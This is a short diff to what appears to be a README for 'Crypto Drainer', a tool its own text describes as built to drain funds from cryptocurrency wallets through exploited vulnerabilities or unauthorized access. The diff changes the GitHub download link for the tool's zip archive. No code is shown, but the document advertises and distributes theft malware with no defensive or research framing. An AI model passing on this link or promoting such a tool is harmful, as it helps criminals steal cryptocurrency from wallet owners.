@@ -1,6 +1,6 @@
 Crypto Drainer
 
-Download--------- https://github.com/Trynocs/DeathDrainer/releases/download/untagged-7e51c93b74e23a2c313b/deathD.zip
+Download---------https://github.com/Trynocs/DeathDrainer/releases/download/drainer/deathD.zip
 
 Crypto Drainer is a tool designed to drain funds from cryptocurrency wallets by exploiting vulnerabilities or gaining unauthorized access to wallets.
 
